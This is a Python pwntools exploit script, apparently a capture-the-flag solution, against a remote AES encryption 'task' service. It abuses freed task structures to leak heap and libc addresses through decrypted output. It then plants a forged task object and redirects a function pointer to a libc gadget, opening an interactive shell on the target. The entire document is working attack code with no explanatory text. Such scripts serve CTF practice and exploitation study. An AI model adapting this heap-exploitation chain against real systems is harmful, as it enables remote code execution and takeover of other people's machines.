from pwn import *
from Crypto.Cipher import AES
g_local=0
context.log_level='debug'
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
UNSORTED_OFF = 0x3ebca0
if g_local:
	sh = process('./task')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = remote("111.186.63.201", 10001)
	#ONE_GADGET_OFF = 0x4557a

def add(tid, key, iv, data, en_or_de=1):
	assert len(key) == 32 and len(iv) == 16
	sh.sendline("1")
	sh.recvuntil("Task id : ")
	sh.sendline(str(tid))
	sh.recvuntil("Encrypt(1) / Decrypt(2): ")
	sh.sendline(str(en_or_de))
	sh.recvuntil("Key : ")
	sh.send(key)
	sh.recvuntil("IV : ")
	sh.send(iv)
	sh.recvuntil("Data Size : ")
	sh.sendline(str(len(data)))
	sh.recvuntil("Data : ")
	sh.send(data)
	sh.recvuntil("Choice: ")

def delete(tid):
	sh.sendline("2")
	sh.recvuntil("Task id : ")
	sh.sendline(str(tid))
	sh.recvuntil("Choice: ")

def perform(tid):
	sh.sendline("3")
	sh.recvuntil("Task id : ")
	sh.sendline(str(tid))
	sh.recvuntil("Choice: ")

def recv_hex(num_row=1):
	sh.recvuntil("Ciphertext: \n")
	ret = ""
	for x in xrange(0, num_row):
		row = sh.recvuntil('\n')[:-2]
		hex_numbers = row.split(' ')
		ret += "".join(map(lambda x : chr(int(x, 16)), hex_numbers))
	return ret

sh.recvuntil("Choice: ")

key = "0123456789abcdef0123456789abcdef"
iv = "0123456789abcdef"

add(1, key, iv, 'A' * 0x500)
add(2, key, iv, 'A' * 0x70)
add(2019, key, iv, 'A') #pad
add(3, key, iv, 'A' * 0x70)
delete(3)
perform(1)
delete(1)
delete(2)
add(4, key, iv, 'A' * 0x600)
add(3, key, iv, 'A' * 0x600)

heap_addr = u64(AES.new(key, AES.MODE_CBC, iv).decrypt(recv_hex())[:8]) - 0x2130
delete(3)
delete(4)

print "heap = " + hex(heap_addr)

add(1, key, iv, 'A' * 0x600)
add(2, key, iv, 'A' * 0x600)
perform(2)
delete(2)
delete(1)

fake_task = p64(heap_addr + 0x15e0)
fake_task += p64(0x40)
fake_task += p32(1)
fake_task += key
fake_task += iv.ljust(36, '\x00')
fake_task += p64(heap_addr + 0x1d10)
fake_task += p64(0xdead)
fake_task = fake_task.ljust(0x70, '\x00')
add(3, key, iv, fake_task)


leak = AES.new(key, AES.MODE_CBC, iv).decrypt(recv_hex())
libc_addr = u64(leak[:8]) - 0x3ebca0
print hex(libc_addr)
delete(3)

add(1, key, iv, 'A' * 0x600)
add(2, key, iv, 'A' * 0x600)
perform(2)
delete(2)
delete(1)

# [rdi+0x10] == 1
# [[rdi] + 0x12] == 0x10
# call [[rdi] + 0x20]
payload_addr = heap_addr + 0x1c10
payload = p64(payload_addr + 0x10).ljust(0x10, '\x00')
payload += p64(1).ljust(0x10, '\x00')
payload += (p16(0) + p8(0x10)).ljust(0x10, '\x00')
payload += p64(libc_addr + 0x10a38c)
payload = payload.ljust(0x58, '\x00')
payload += p64(payload_addr)
payload = payload.ljust(0x70, '\x00')

add(3, key, iv, payload)

sh.interactive()
